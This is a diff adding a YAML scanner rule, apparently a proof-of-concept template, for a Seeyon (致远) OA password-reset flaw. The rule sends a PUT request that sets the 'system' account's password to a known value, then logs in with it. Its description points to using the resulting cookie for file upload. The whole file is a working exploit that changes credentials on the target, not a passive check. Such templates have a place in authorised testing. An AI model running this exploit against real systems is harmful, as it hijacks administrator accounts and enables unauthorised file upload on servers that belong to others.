@@ -1,0 +1,18 @@
+name: 致远OA-ucpcLogin-密码重置
+description: >-
+  system/genericController.do,登录获取cookie可利用/seeyon/fileUpload接口文件上传
+alwaysExecute: false
+matchCount: 2
+rules:
+  - method: PUT
+    path: /seeyon/rest/orgMember/-7273032013234748168/password/genericController.do
+    expression:
+      status: 200
+      body_all: ["loginName"]
+  - method: POST
+    path: /seeyon/rest/authentication/ucpcLogin?login_username=system&login_password=genericController.do&ticket=
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+    expression:
+      status: 200
+      body_all: ["system"]
